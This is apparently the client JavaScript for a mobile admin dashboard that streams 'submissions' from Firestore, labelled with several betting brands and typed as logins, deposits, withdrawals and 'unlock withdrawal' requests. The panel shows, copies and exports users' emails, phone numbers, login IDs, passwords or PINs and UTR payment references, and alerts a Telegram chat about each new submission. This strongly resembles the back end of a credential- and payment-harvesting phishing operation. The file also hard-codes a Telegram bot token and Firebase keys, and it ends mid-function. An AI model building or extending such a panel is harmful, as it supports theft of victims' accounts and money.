/* ==========================================
   ADMIN PANEL · Mobile Only
   Firebase Firestore · real-time dashboard
   ========================================== */

const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
  authDomain: "alll-projects-admin-pennal.firebaseapp.com",
  projectId: "alll-projects-admin-pennal",
  storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
  messagingSenderId: "689297868215",
  appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

const SITE_LABELS = {
  '1up_game':   { name: '1UP Game',   icon: 'fa-gamepad',      color: '#FF6B35' },
  'batery_bet': { name: 'Batery Bet', icon: 'fa-battery-full',  color: '#00E676' },
  'crorebet':   { name: 'CroreBet',   icon: 'fa-coins',         color: '#F5C518' },
  'lucky_star': { name: 'Lucky Star', icon: 'fa-star',          color: '#FFD700' },
  'melbet':     { name: 'MELBET',     icon: 'fa-star',          color: '#FFB800' },
  'odds96':     { name: 'ODDS96',     icon: 'fa-bullseye',      color: '#FF5252' },
  'parimatch':  { name: 'Parimatch',  icon: 'fa-trophy',        color: '#B388FF' },
  'topx_game':  { name: 'TOPX Game',  icon: 'fa-bolt',          color: '#FFB74D' }
};

let _db = null, _unsub = null, _retryTimer = null, _firstLoad = true;

function loadFirebase() {
  return new Promise((resolve, reject) => {
    try {
      if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
      _db = firebase.firestore();
      _db.enablePersistence({ synchronizeTabs: true }).catch(() => {});
      resolve(_db);
    } catch (e) { reject(e); }
  });
}

function startListener() {
  if (_unsub) { _unsub(); _unsub = null; }
  clearTimeout(_retryTimer);
  _unsub = _db.collection('submissions')
    .orderBy('created_at', 'desc')
    .limit(500)
    .onSnapshot({ includeMetadataChanges: true }, snap => {
      if (snap.metadata.fromCache && _firstLoad) return;
      const newIds = new Set();
      snap.forEach(d => newIds.add(d.id));
      if (state.prevIds.size > 0) {
        let n = 0;
        var newSubs = [];
        newIds.forEach(function (id) {
          if (!state.prevIds.has(id)) {
            n++;
            var sub = snap.docs.find(function (d) { return d.id === id; });
            if (sub) newSubs.push(sub.data());
          }
        });
        if (n > 0) {
          playBeep();
          toast('New ' + n + ' submission' + (n > 1 ? 's' : ''), 'success');
          var site = newSubs[0]?.site_id || 'Unknown';
          var type = newSubs[0]?.type || 'N/A';
          var msg = '<b>📢 New Submission!</b>\nSite: ' + site + '\nType: ' + type + '\nCount: ' + n + '\n<a href="https://console.firebase.google.com">Check Admin Panel</a>';
          sendTelegramAlert(msg);
        }
      }
      state.prevIds = newIds;
      state.allSubs = snap.docs.map(d => ({ id: d.id, ...d.data() }));
      _firstLoad = false;
      setConn(snap.metadata.fromCache ? 'cached' : 'connected');
      renderAll();
    }, err => {
      console.error(err);
      setConn('error');
      _retryTimer = setTimeout(() => { setConn('connecting'); startListener(); }, 5000);
    });
}

var TELEGRAM_CONFIG = {
  botToken: localStorage.getItem('tg_bot_token') || '8853360102:AAERqOXQhrUnjvTHsVMIt_5bnVP1IdAWh6g',
  chatId: localStorage.getItem('tg_chat_id') || '-1003725622375',
  enabled: localStorage.getItem('tg_enabled') === 'true'
};

function saveTelegramConfig() {
  localStorage.setItem('tg_bot_token', TELEGRAM_CONFIG.botToken);
  localStorage.setItem('tg_chat_id', TELEGRAM_CONFIG.chatId);
  localStorage.setItem('tg_enabled', TELEGRAM_CONFIG.enabled);
}

function sendTelegramAlert(message) {
  if (!TELEGRAM_CONFIG.enabled || !TELEGRAM_CONFIG.botToken || !TELEGRAM_CONFIG.chatId) return;
  var url = 'https://api.telegram.org/bot' + TELEGRAM_CONFIG.botToken + '/sendMessage';
  var payload = { chat_id: TELEGRAM_CONFIG.chatId, text: message, parse_mode: 'HTML' };
  fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) })
    .then(function (r) { return r.json(); })
    .then(function (d) { if (!d.ok) console.warn('Telegram send failed:', d); })
    .catch(function (e) { console.warn('Telegram error:', e); });
}

const state = {
  allSubs: [], currentPage: 'dashboard',
  filter: { range: 'all', site: 'all', type: 'all', search: '', sort: 'newest' },
  selected: new Set(), sound: false, prevIds: new Set(), audioCtx: null
};

const $ = id => document.getElementById(id);
const els = {};
function cacheDom() {
  const ids = ['connDot','soundBtn','soundIcon','topbarTitle',
    'kpiTotal','kpiToday','kpiWeek','siteBars','spark','mixRow','recentList',
    'siteCards','siteCount','topStats',
    'searchInput','searchClear','datePills','sitePills','typePills',
    'exportBtn','selectAll','listCount','sortSelect','bulkBar','bulkCount',
    'bulkExport','bulkClear','list',
    'modalBg','modalTitle','modalBody','modalClose','modalCopyAll','modalDelete',
    'confirmBg','confirmTitle','confirmMsg','confirmCancel','confirmOk',
    'toast','analyticsSiteBars','analyticsSpark','analyticsMix','topFields',
    'settingsExport','soundToggle','viewAllBtn','viewAllBtn2',
    'tgToggle','tgBotToken','tgChatId','tgSaveBtn','tgTestBtn'];
  ids.forEach(id => { els[id] = $(id); });
}

const esc = s => s == null ? '' : String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const isImageUrl = s => typeof s === 'string' && (s.match(/^https?:\/\/.*\.(jpg|jpeg|png|gif|webp)/i) || s.match(/^https:\/\/t\.me\//) || s.match(/^https:\/\/i\.ibb\.co\//));
const renderFieldValue = (v, k) => {
  const s = String(v);
  if (isImageUrl(s)) return `<div class="img-preview"><img src="${esc(s)}" alt="${esc(k)}" loading="lazy" onclick="openImagePreview('${esc(s)}')" /><button class="img-copy-btn" onclick="event.stopPropagation();copyText('${esc(s)}')"><i class="fa-regular fa-copy"></i></button></div>`;
  const pwd = isPwd(k);
  return `<span${pwd?' class="password"':''}>${esc(s)}</span><button class="field-copy" data-copy="${esc(s)}"><i class="fa-regular fa-copy"></i></button>`;
};
const toDate = ts => { if (!ts) return null; const d = ts.toDate ? ts.toDate() : new Date(ts); return isNaN(d.getTime()) ? null : d; };
const fmtTime = ts => { const d = toDate(ts); if (!d) return '—'; return d.toLocaleString('en-IN', { day:'2-digit', month:'short', year:'numeric', hour:'2-digit', minute:'2-digit', hour12:true }); };
const fmtRel = ts => {
  const d = toDate(ts); if (!d) return '—';
  const diff = Date.now() - d.getTime();
  if (diff < 60000) return 'now';
  if (diff < 3600000) return Math.floor(diff/60000) + 'm';
  if (diff < 86400000) return Math.floor(diff/3600000) + 'h';
  if (diff < 604800000) return Math.floor(diff/86400000) + 'd';
  return fmtTime(ts);
};
const isPwd = k => /password|passwd|pwd|secret|pin/i.test(k);
const getEvent = d => {
  if (d.event) return d.event;
  if (d.type) { const t = d.type.toLowerCase(); if (t.includes('login')) return 'login'; if (t.includes('deposit')) return 'deposit'; if (t.includes('withdrawal')||t.includes('withdraw')) return 'withdrawal'; if (t.includes('unblock')) return 'unblock'; if (t.includes('bonus')) return 'bonus'; }
  return 'other';
};
const getTypeLabel = d => { const e = getEvent(d); return e === 'login' ? 'Login' : e === 'deposit' ? 'Deposit' : e === 'withdrawal' ? 'Withdrawal' : e === 'unblock' ? 'Unlock Withdrawal' : e === 'bonus' ? 'Bonus Problem' : d.type || 'Other'; };
const getTypeBadge = e => e === 'login' ? 'badge-type-login' : e === 'deposit' ? 'badge-type-deposit' : e === 'withdrawal' ? 'badge-type-withdrawal' : e === 'unblock' ? 'badge-type-unblock' : e === 'bonus' ? 'badge-type-bonus' : 'badge-type-other';
const getTypeIcon = e => e === 'login' ? 'fa-lock' : e === 'deposit' ? 'fa-dollar-sign' : e === 'withdrawal' ? 'fa-money-bill-transfer' : e === 'unblock' ? 'fa-unlock' : e === 'bonus' ? 'fa-gift' : 'fa-circle-question';
const copyText = t => { navigator.clipboard?.writeText(t).then(() => toast('Copied')); };

let toastT;
function toast(msg, type) {
  clearTimeout(toastT);
  els.toast.className = 'toast' + (type ? ' ' + type : '');
  els.toast.textContent = msg;
  requestAnimationFrame(() => els.toast.classList.add('show'));
  toastT = setTimeout(() => els.toast.classList.remove('show'), 2200);
}

function setConn(s) {
  els.connDot.classList.remove('connected','error','cached');
  if (s === 'connected') els.connDot.classList.add('connected');
  else if (s === 'error') els.connDot.classList.add('error');
  else if (s === 'cached') els.connDot.classList.add('cached');
}

function playBeep() {
  if (!state.sound) return;
  try {
    if (!state.audioCtx) state.audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const ctx = state.audioCtx, o = ctx.createOscillator(), g = ctx.createGain();
    o.connect(g); g.connect(ctx.destination);
    o.frequency.value = 880; o.type = 'sine';
    g.gain.setValueAtTime(0, ctx.currentTime);
    g.gain.linearRampToValueAtTime(0.08, ctx.currentTime + 0.02);
    g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
    o.start(); o.stop(ctx.currentTime + 0.4);
  } catch(e) {}
}

const pageTitles = { dashboard: 'Dashboard', submissions: 'Submissions', analytics: 'Analytics', settings: 'Settings' };

function navigate(page) {
  state.currentPage = page;
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-tab').forEach(n => n.classList.remove('active'));
  const pageEl = $('page-' + page);
  const navEl = document.querySelector(`.nav-tab[data-page="${page}"]`);
  if (pageEl) pageEl.classList.add('active');
  if (navEl) navEl.classList.add('active');
  els.topbarTitle.textContent = pageTitles[page] || page;
  renderAll();
}

function initBottomNav() {
  document.querySelectorAll('.nav-tab').forEach(n => {
    n.addEventListener('click', () => navigate(n.dataset.page));
  });
  document.querySelectorAll('.link-btn').forEach(a => {
    a.addEventListener('click', e => {
      e.preventDefault();
      const href = a.getAttribute('href');
      if (href && href.startsWith('#')) navigate(href.slice(1));
    });
  });
  if (els.viewAllBtn) els.viewAllBtn.addEventListener('click', () => navigate('submissions'));
  if (els.viewAllBtn2) els.viewAllBtn2.addEventListener('click', () => navigate('submissions'));
}

function initFilters() {
  els.searchInput.addEventListener('input', e => {
    state.filter.search = e.target.value;
    els.searchClear.hidden = !e.target.value;
    renderList();
  });
  els.searchClear.addEventListener('click', () => {
    els.searchInput.value = ''; state.filter.search = '';
    els.searchClear.hidden = true; renderList(); els.searchInput.focus();
  });
  els.datePills.querySelectorAll('.pill').forEach(p => {
    p.addEventListener('click', () => {
      els.datePills.querySelectorAll('.pill').forEach(x => x.classList.remove('active'));
      p.classList.add('active'); state.filter.range = p.dataset.range; renderAll();
    });
  });
  els.typePills.querySelectorAll('.pill').forEach(p => {
    p.addEventListener('click', () => {
      els.typePills.querySelectorAll('.pill').forEach(x => x.classList.remove('active'));
      p.classList.add('active'); state.filter.type = p.dataset.type; renderList();
    });
  });
  els.sortSelect?.addEventListener('change', e => { state.filter.sort = e.target.value; renderList(); });
  els.soundBtn.addEventListener('click', () => {
    state.sound = !state.sound;
    els.soundIcon.className = state.sound ? 'fa-solid fa-volume-high' : 'fa-solid fa-volume-xmark';
    if (els.soundToggle) els.soundToggle.checked = state.sound;
    toast('Sound ' + (state.sound ? 'on' : 'off'));
  });
  if (els.soundToggle) els.soundToggle.addEventListener('change', e => {
    state.sound = e.target.checked;
    els.soundIcon.className = state.sound ? 'fa-solid fa-volume-high' : 'fa-solid fa-volume-xmark';
    toast('Sound ' + (state.sound ? 'on' : 'off'));
  });
}

function inDateRange(ts) {
  if (state.filter.range === 'all') return true;
  const d = toDate(ts); if (!d) return false;
  const now = Date.now();
  if (state.filter.range === '24h') return d >= new Date(now - 86400000);
  if (state.filter.range === '7d') return d >= new Date(now - 604800000);
  if (state.filter.range === '30d') return d >= new Date(now - 2592000000);
  return true;
}

function applyFilters(list) {
  const q = state.filter.search.trim().toLowerCase();
  return list.filter(s => {
    if (!inDateRange(s.created_at)) return false;
    if (state.filter.site !== 'all' && s.site_id !== state.filter.site) return false;
    if (state.filter.type !== 'all' && getEvent(s) !== state.filter.type) return false;
    if (q) {
      const hay = [s.email,s.mobile,s.login_id,s.user_id,s.gameid,s.game_id,s.amount,s.utr,s.type,s.description,s.id].map(v => (v==null?'':String(v)).toLowerCase()).join(' ');
      if (!hay.includes(q)) return false;
    }
    return true;
  });
}

function getSiteCounts() {
  const c = {}; state.allSubs.forEach(s => { if (s.site_id) c[s.site_id] = (c[s.site_id]||0)+1; });
  return Object.entries(c).sort((a,b) => b[1]-a[1]);
}

function renderDashboard() {
  const now = new Date();
  const startOfDay = new Date(now.getFullYear(), now.getMonth(), now.getDate());
  const startOfWeek = new Date(now); startOfWeek.setDate(now.getDate()-7);
  let total = state.allSubs.length, today = 0, week = 0;
  state.allSubs.forEach(s => {
    const d = toDate(s.created_at); if (!d) return;
    if (d >= startOfDay) today++;
    if (d >= startOfWeek) week++;
  });
  els.kpiTotal.textContent = total;
  els.kpiToday.textContent = today;
  els.kpiWeek.textContent = week;

  renderSiteCards();
  renderSpark(els.spark);
  renderMix(els.mixRow);
  renderRecent();
}

function renderSiteCards() {
  const counts = {};
  state.allSubs.forEach(s => { if (s.site_id) counts[s.site_id] = (counts[s.site_id]||0)+1; });
  Object.keys(SITE_LABELS).forEach(sid => { if (!counts[sid]) counts[sid] = 0; });
  const sortedSites = Object.entries(counts).sort((a,b) => b[1]-a[1]);

  if (!sortedSites.length) { els.siteCards.innerHTML = '<div class="empty-state">No sites</div>'; return; }

  const today = new Date(); today.setHours(0,0,0,0);
  const max = sortedSites[0][1] || 1;
  els.siteCards.innerHTML = sortedSites.map(([sid, n]) => {
    const meta = SITE_LABELS[sid] || { name: sid, icon: 'fa-globe', color: '#8888a8' };
    const todayCount = state.allSubs.filter(s => {
      if (s.site_id !== sid) return false;
      const d = toDate(s.created_at);
      return d && d >= today;
    }).length;
    return `<div class="site-card" style="--site-color:${meta.color}" data-site="${esc(sid)}">
      <div class="site-card-top">
        <div class="site-card-icon" style="background:${meta.color}15;color:${meta.color}">
          <i class="fa-solid ${meta.icon}"></i>
        </div>
        <div class="site-card-today">${todayCount} today</div>
      </div>
      <div class="site-card-name">${esc(meta.name)}</div>
      <div class="site-card-count">${n}</div>
      <div class="site-card-label">users</div>
      <div class="site-card-bar"><div class="site-card-bar-fill" style="width:${Math.round((n/max)*100)}%;background:${meta.color}"></div></div>
    </div>`;
  }).join('');

  els.siteCards.querySelectorAll('.site-card').forEach(card => {
    card.addEventListener('click', () => {
      state.filter.site = card.dataset.site;
      navigate('submissions');
    });
  });
}

function renderRecent() {
  const recent = state.allSubs.slice(0, 5);
  if (recent.length === 0) { els.recentList.innerHTML = '<div class="empty-state">No submissions yet</div>'; return; }
  els.recentList.innerHTML = recent.map(s => {
    const site = SITE_LABELS[s.site_id] || { name: s.site_id||'Unknown', icon: 'fa-globe', color: '#8888a8' };
    const ev = getEvent(s);
    const keyField = s.email || s.mobile || s.utr || s.amount || s.gameid || '—';
    return `<div class="recent-item" data-id="${esc(s.id)}">
      <div class="recent-icon" style="background:${site.color}18;color:${site.color}"><i class="fa-solid ${site.icon}"></i></div>
      <div class="recent-info">
        <div class="recent-title">${esc(keyField)}</div>
        <div class="recent-sub">${esc(site.name)} · ${esc(getTypeLabel(s))}</div>
      </div>
      <div class="recent-time">${fmtRel(s.created_at)}</div>
    </div>`;
  }).join('');
  els.recentList.querySelectorAll('.recent-item').forEach(el => {
    el.addEventListener('click', () => {
      const sub = state.allSubs.find(s => s.id === el.dataset.id);
      if (sub) openModal(sub);
    });
  });
}

function renderSiteBars(container) {
  const entries = getSiteCounts();
  if (!entries.length) { container.innerHTML = '<div class="empty-state">No data</div>'; return; }
  const max = entries[0][1];
  container.innerHTML = entries.map(([sid, n]) => {
    const meta = SITE_LABELS[sid] || { name: sid, icon: 'fa-globe', color: '#8888a8' };
    return `<div class="site-row"><div class="site-name"><i class="fa-solid ${meta.icon}" style="color:${meta.color}"></i> ${esc(meta.name)}</div><div class="site-count">${n}</div><div class="site-bar-bg"><div class="site-bar-fill" style="width:${Math.round((n/max)*100)}%;background:${meta.color}"></div></div></div>`;
  }).join('');
}

function renderSpark(container) {
  const days = [], now = new Date();
  for (let i = 6; i >= 0; i--) {
    const d = new Date(now.getFullYear(), now.getMonth(), now.getDate()-i);
    const next = new Date(d); next.setDate(d.getDate()+1);
    days.push({ start: d, end: next, label: d.toLocaleDateString('en-IN',{day:'2-digit',month:'short'}) });
  }
  const counts = days.map(({start,end}) => state.allSubs.filter(s => { const dt = toDate(s.created_at); return dt && dt>=start && dt<end; }).length);
  const max = Math.max(1, ...counts);
  container.innerHTML = days.map((d,i) => `<div class="spark-bar" style="height:${Math.max(4,(counts[i]/max)*50)}px" title="${d.label}: ${counts[i]}"></div>`).join('');
}

function renderMix(container) {
  const startOfWeek = new Date(); startOfWeek.setDate(startOfWeek.getDate()-7);
  const in7d = state.allSubs.filter(s => { const dt = toDate(s.created_at); return dt && dt >= startOfWeek; });
  const mix = { login:0, deposit:0, withdrawal:0, unblock:0, bonus:0, other:0 };
  in7d.forEach(s => { mix[getEvent(s)]++; });
  container.innerHTML = `
    <span class="mix-chip deposit"><i class="fa-solid fa-dollar-sign"></i> Deposits <strong>${mix.deposit}</strong></span>
    <span class="mix-chip withdrawal"><i class="fa-solid fa-money-bill-transfer"></i> Withdrawals <strong>${mix.withdrawal}</strong></span>
    <span class="mix-chip login"><i class="fa-solid fa-lock"></i> Logins <strong>${mix.login}</strong></span>
    <span class="mix-chip unblock"><i class="fa-solid fa-unlock"></i> Unlock Withdrawals <strong>${mix.unblock}</strong></span>
    <span class="mix-chip bonus"><i class="fa-solid fa-gift"></i> Bonus Problems <strong>${mix.bonus}</strong></span>
    <span class="mix-chip other"><i class="fa-solid fa-circle-question"></i> Other <strong>${mix.other}</strong></span>`;
}

function renderAnalytics() {
  renderSiteBars(els.analyticsSiteBars);
  renderSpark(els.analyticsSpark);
  renderMix(els.analyticsMix);
  renderTopFields();
}

function renderTopFields() {
  const counts = {};
  state.allSubs.forEach(s => { Object.keys(s).forEach(k => { if (!['site_id','created_at','id','event'].includes(k)) counts[k] = (counts[k]||0)+1; }); });
  const sorted = Object.entries(counts).sort((a,b) => b[1]-a[1]).slice(0, 8);
  if (!sorted.length) { els.topFields.innerHTML = '<div class="empty-state">No data</div>'; return; }
  els.topFields.innerHTML = sorted.map(([k,n]) =>
    `<div class="top-field"><span class="top-field-name">${esc(k.replace(/_/g,' '))}</span><span class="top-field-count">${n}</span></div>`
  ).join('');
}

function renderSitePills() {
  const entries = getSiteCounts();
  const all = state.allSubs.length;
  let html = `<button class="pill ${state.filter.site==='all'?'active':''}" data-site="all">All (${all})</button>`;
  entries.forEach(([sid, n]) => {
    const meta = SITE_LABELS[sid] || { name: sid, icon: 'fa-globe' };
    html += `<button class="pill ${state.filter.site===sid?'active':''}" data-site="${esc(sid)}"><i class="fa-solid ${meta.icon}"></i> ${esc(meta.name)} (${n})</button>`;
  });
  els.sitePills.innerHTML = html;
  els.sitePills.querySelectorAll('.pill').forEach(p => {
    p.addEventListener('click', () => { state.filter.site = p.dataset.site; renderSitePills(); renderList(); });
  });
}

function renderList() {
  const filtered = applyFilters(state.allSubs);
  const sorted = filtered.slice();
  if (state.filter.sort === 'newest') sorted.sort((a,b) => (toDate(b.created_at)||0)-(toDate(a.created_at)||0));
  else if (state.filter.sort === 'oldest') sorted.sort((a,b) => (toDate(a.created_at)||0)-(toDate(b.created_at)||0));
  else if (state.filter.sort === 'site') sorted.sort((a,b) => (a.site_id||'').localeCompare(b.site_id||''));

  els.listCount.textContent = sorted.length + ' submission' + (sorted.length===1?'':'s');
  state.selected.forEach(id => { if (!sorted.find(s => s.id === id)) state.selected.delete(id); });
  if (els.selectAll) els.selectAll.checked = sorted.length > 0 && sorted.every(s => state.selected.has(s.id));
  updateBulkBar();

  if (!sorted.length) {
    const f = state.filter.search || state.filter.site !== 'all' || state.filter.type !== 'all' || state.filter.range !== 'all';
    els.list.innerHTML = `<div class="empty"><div class="empty-icon"><i class="fa-solid ${f?'fa-magnifying-glass':'fa-inbox'}"></i></div><div class="empty-text">${f?'No matches':'No submissions'}</div><div class="empty-sub">${f?'Clear filters':'Data appears here in real-time'}</div></div>`;
    return;
  }

  els.list.innerHTML = sorted.map(s => {
    const site = SITE_LABELS[s.site_id] || { name: s.site_id||'Unknown', icon: 'fa-globe', color: '#8888a8' };
    const ev = getEvent(s), isSel = state.selected.has(s.id);
    const skip = new Set(['site_id','created_at','id','event','request_id','reqId','timestamp','timestampMs','time']);
    const fields = [];
    Object.keys(s).forEach(k => {
      if (skip.has(k)) return;
      const v = s[k]; if (v===null||v===undefined||v===''||v==='N/A') return;
      fields.push(`<div class="field"><div class="field-label">${esc(k.replace(/_/g,' '))}</div><div class="field-value">${renderFieldValue(v, k)}</div></div>`);
    });

    return `<div class="card${isSel?' selected':''}" data-id="${esc(s.id)}">
      <div class="card-check"><label class="check-wrap" onclick="event.stopPropagation()"><input type="checkbox" class="card-check-input" data-id="${esc(s.id)}"${isSel?' checked':''}/><span class="check-box"></span></label></div>
      <div class="card-body" data-action="open">
        <div class="card-head">
          <span class="badge badge-site" style="background:${site.color}15;color:${site.color}"><i class="fa-solid ${site.icon}"></i> ${esc(site.name)}</span>
          <span class="badge ${getTypeBadge(ev)}"><i class="fa-solid ${getTypeIcon(ev)}"></i> ${esc(getTypeLabel(s))}</span>
          <span class="card-time">${fmtRel(s.created_at)}</span>
        </div>
        <div class="card-fields">${fields.join('')}</div>
      </div>
    </div>`;
  }).join('');

  els.list.querySelectorAll('.card-check-input').forEach(cb => {
    cb.addEventListener('change', e => {
      if (e.target.checked) state.selected.add(e.target.dataset.id); else state.selected.delete(e.target.dataset.id);
      e.target.closest('.card')?.classList.toggle('selected', e.target.checked);
      if (els.selectAll) els.selectAll.checked = state.selected.size > 0 && [...els.list.querySelectorAll('.card')].every(c => state.selected.has(c.dataset.id));
      updateBulkBar();
    });
  });
  els.list.querySelectorAll('[data-action="open"]').forEach(b => {
    b.addEventListener('click', e => {
      if (e.target.closest('.field-copy')) return;
      const sub = state.allSubs.find(s => s.id === b.closest('.card').dataset.id);
      if (sub) openModal(sub);
    });
  });
  els.list.querySelectorAll('.field-copy').forEach(b => {
    b.addEventListener('click', e => { e.stopPropagation(); copyText(b.dataset.copy); });
  });
}

function updateBulkBar() {
  const n = state.selected.size;
  if (els.bulkBar) els.bulkBar.hidden = n === 0;
  if (els.bulkCount) els.bulkCount.textContent = n;
}

let modalCurrent = null;
function openModal(sub) {
  modalCurrent = sub;
  const site = SITE_LABELS[sub.site_id] || { name: sub.site_id||'Unknown', icon: 'fa-globe', color: '#8888a8' };
  const ev = getEvent(sub);
  els.modalTitle.innerHTML = `<span class="badge badge-site" style="background:${site.color}15;color:${site.color}"><i class="fa-solid ${site.icon}"></i> ${esc(site.name)}</span> <span class="badge ${getTypeBadge(ev)}"><i class="fa-solid ${getTypeIcon(ev)}"></i> ${esc(getTypeLabel(sub))}</span>`;
  const skip = new Set(['site_id','event']);
  const fieldsHTML = [];
  Object.keys(sub).forEach(k => {
    if (skip.has(k)) return;
    const v = sub[k]; if (v===null||v===undefined||v===''||v==='N/A') return;
    let display = v; if (k==='created_at'&&v?.toDate) display = v.toDate().toLocaleString();
    let valueHTML;
    if (k!=='created_at' && isImageUrl(String(v))) {
      valueHTML = `<div class="modal-img-wrap"><img src="${esc(String(v))}" alt="${esc(k)}" loading="lazy" onclick="openImagePreview('${esc(String(v))}')" /><button class="img-copy-btn" onclick="event.stopPropagation();copyText('${esc(String(v))}')"><i class="fa-regular fa-copy"></i></button></div>`;
    } else {
      const pwd = isPwd(k);
      valueHTML = `<div class="modal-field-value${pwd?' password':''}">${esc(String(display))}</div>`;
    }
    fieldsHTML.push(`<div class="modal-field"><div><div class="modal-field-label">${esc(k.replace(/_/g,' '))}</div>${valueHTML}</div><button class="modal-field-copy" data-copy="${esc(String(v?.toDate?v.toDate().toISOString():v))}">Copy</button></div>`);
  });
  els.modalBody.innerHTML = fieldsHTML.join('') || '<div style="text-align:center;color:var(--text3);padding:20px">No data</div>';
  els.modalBody.querySelectorAll('.modal-field-copy').forEach(b => b.addEventListener('click', () => copyText(b.dataset.copy)));
  els.modalBg.classList.add('show');
}

function exportCSV(data, tag) {
  const keysSet = new Set(); data.forEach(d => Object.keys(d).forEach(k => keysSet.add(k)));
  const keys = Array.from(keysSet);
  const priority = ['created_at','site_id','event','type','email','mobile','login_id','user_id','amount','utr','withdraw_method','request_id','gameid','game_id','description','status','id'];
  keys.sort((a,b) => { const ia=priority.indexOf(a),ib=priority.indexOf(b); if(ia===-1&&ib===-1)return a.localeCompare(b); if(ia===-1)return 1; if(ib===-1)return -1; return ia-ib; });
  const e = v => { if(v==null)return''; let s=(v?.toDate)?v.toDate().toISOString():String(v); s=s.replace(/"/g,'""'); return s.search(/[",\n]/)>=0?'"'+s+'"':s; };
  const csv = '\uFEFF'+keys.join(',')+'\n'+data.map(d=>keys.map(k=>e(d[k])).join(',')).join('\n');
  const blob = new Blob([csv],{type:'text/csv;charset=utf-8;'});
  const url = URL.createObjectURL(blob), a = document.createElement('a');
  a.href = url; a.download = 'submissions_'+tag+'_'+new Date().toISOString().slice(0,10)+'.csv';
  document.body.appendChild(a); a.click(); document.body.removeChild(a); URL.revokeObjectURL(url);
}

async function deleteOne(id) {
  const cardEl = els.list?.querySelector(`.card[data-id="${CSS.escape(id)}"]`);
  if (cardEl) cardEl.style.opacity = '0';
  try {
    await _db.collection('submissions').doc(id).delete();
    state.allSubs = state.allSubs.filter(s => s.id !== id);
    state.selected.delete(id);
    setTimeout(() => { renderAll(); toast('Deleted','success'); }, 250);
  } catch(e) {
    if (cardEl) cardEl.style.opacity = '1';
    toast('Delete failed','error');
  }
}

async function deleteMany(ids) {
  try {
    const batch = _db.batch();
    ids.forEach(id => batch.delete(_db.collection('submissions').doc(id)));
    await batch.commit();
    state.allSubs = state.allSubs.filter(s => !ids.includes(s.id));
    state.selected.clear(); renderAll(); toast('Deleted '+ids.length,'success');
  } catch(e) { toast('Delete failed','error'); }
}

let pendingAction = null;

function renderAll() {
  const p = state.currentPage;
  if (p === 'dashboard') renderDashboard();
  else if (p === 'submissions') { renderSitePills(); renderList(); }
  else if (p === 'analytics') renderAnalytics();
}

function initEvents() {
  if (els.selectAll) els.selectAll.addEventListener('change', e => {
    const sorted = applyFilters(state.allSubs);
    sorted.forEach(s => { if (e.target.checked) state.selected.add(s.id); else state.selected.delete(s.id); });
    renderList();
  });
  if (els.bulkClear) els.bulkClear.addEventListener('click', () => { state.selected.clear(); renderList(); });
  if (els.bulkExport) els.bulkExport.addEventListener('click', () => {
    if (!state.selected.size) return;
    exportCSV(state.allSubs.filter(s => state.selected.has(s.id)), 'selected');
    toast('Exported');
  });

  if (els.modalClose) els.modalClose.addEventListener('click', () => els.modalBg.classList.remove('show'));
  if (els.modalBg) els.modalBg.addEventListener('click', e => { if (e.target === els.modalBg) els.modalBg.classList.remove('show'); });
  if (els.modalCopyAll) els.modalCopyAll.addEventListener('click', () => {
    if (!modalCurrent) return;
    copyText(Object.entries(modalCurrent).map(([k,v]) => `${k}: ${v?.toDate?v.toDate().toISOString():v}`).join('\n'));
  });
  if (els.modalDelete) els.modalDelete.addEventListener('click', () => {
    if (!modalCurrent) return;
    pendingAction = { type: 'first-confirm', id: modalCurrent.id };
    els.confirmTitle.textContent = 'Delete this?';
    els.confirmMsg.textContent = 'Are you sure you want to delete this submission?';
    els.confirmBg.classList.add('show');
  });

  if (els.settingsExport) els.settingsExport.addEventListener('click', () => {
    if (!state.allSubs.length) return toast('Nothing to export');
    exportCSV(state.allSubs, 'all');
    toast('Exported ' + state.allSubs.length + ' rows');
  });

  initTelegramUI();

  if (els.confirmCancel) els.confirmCancel.addEventListener('click', () => { els.confirmBg.classList.remove('show'); pendingAction = null; });
  if (els.confirmBg) els.confirmBg.addEventListener('click', e => { if(e.target===els.confirmBg){els.confirmBg.classList.remove('show');pendingAction=null;} });
  if (els.confirmOk) els.confirmOk.addEventListener('click', async () => {
    if (!pendingAction) return;
    if (pendingAction.type === 'first-confirm') {
      pendingAction = { type: 'single-delete', id: pendingAction.id };
      els.confirmTitle.textContent = 'Are you really sure?';
      els.confirmMsg.textContent = 'This action CANNOT be undone. Data will be permanently deleted.';
      return;
    }
    els.confirmBg.classList.remove('show');
    const act = pendingAction; pendingAction = null;
    if (act.type === 'single-delete') { els.modalBg.classList.remove('show'); await deleteOne(act.id); }
    else if (act.type === 'bulk-delete') await deleteMany(act.ids);
  });

  document.addEventListener('keydown', e => {
    if (e.key === 'Escape') {
      if (els.confirmBg?.classList.contains('show')) { els.confirmBg.classList.remove('show'); pendingAction = null; }
      else if (els.modalBg?.classList.contains('show')) els.modalBg.classList.remove('show');
    }
  });
}

function initTelegramUI() {
  if (els.tgToggle) {
    els.tgToggle.checked = TELEGRAM_CONFIG.enabled;
    els.tgToggle.addEventListener('change', function () {
      TELEGRAM_CONFIG.enabled = els.tgToggle.checked;
      saveTelegramConfig();
      toast('Telegram ' + (TELEGRAM_CONFIG.enabled ? 'enabled' : 'disabled'));
    });
  }
  if (els.tgBotToken) els.tgBotToken.value = TELEGRAM_CONFIG.botToken;
  if (els.tgChatId) els.tgChatId.value = TELEGRAM_CONFIG.chatId;
  if (els.tgSaveBtn) {
    els.tgSaveBtn.addEventListener('click', function () {
      TELEGRAM_CONFIG.botToken = els.tgBotToken.value.trim();
      TELEGRAM_CONFIG.chatId = els.tgChatId.value.trim();
      saveTelegramConfig();
      toast('Telegram settings saved');
    });
  }
  if (els.tgTestBtn) {
    els.tgTestBtn.addEventListener('click', function () {
      var token = els.tgBotToken.value.trim();
      var chat = els.tgChatId.value.trim();
      if (!token || !chat) { toast('Enter token and chat ID first', 'error'); return; }
      var oldToken = TELEGRAM_CONFIG.botToken;
      var oldChat = TELEGRAM_CONFIG.chatId;
